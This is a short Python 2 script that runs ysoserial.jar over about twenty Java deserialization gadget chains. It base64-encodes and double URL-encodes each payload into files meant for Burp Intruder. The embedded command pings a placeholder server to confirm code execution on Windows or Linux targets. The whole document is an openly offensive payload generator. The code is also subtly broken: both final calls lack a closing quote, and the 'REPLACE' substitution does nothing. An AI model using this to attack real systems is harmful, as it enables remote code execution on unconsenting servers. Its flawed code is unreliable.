import os
import re
import base64
import urllib
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2',
            'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'Groovy1',
            'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21',
            'MozillaRhino1', 'Myfaces1', 'ROME', 'Spring1', 'Spring2']
def generate(name, cmd):
    for payload in payloads:
        final = cmd.replace('REPLACE', payload)
        print 'Generating ' + payload + ' for ' + name + '...'
        command = os.popen('java -jar ../ysoserial.jar ' + payload + ' "' + final + '"')
        result = command.read()
        command.close()
        encoded = base64.b64encode(result)
        if encoded != "":
            #Create line breaks at 76 characters
            encoded = re.sub("(.{76})", "\\1\n", encoded, 0, re.DOTALL)
            #Double URL encode the payload
            encoded = urllib.quote_plus(urllib.quote_plus(encoded))
            open(name + payload + '_intruder.txt', 'a').write(encoded + '\n')
 
generate('Windows', 'ping -n 1 [MY_SERVER])
generate('Linux', 'ping -c 1 [MY_SERVER])

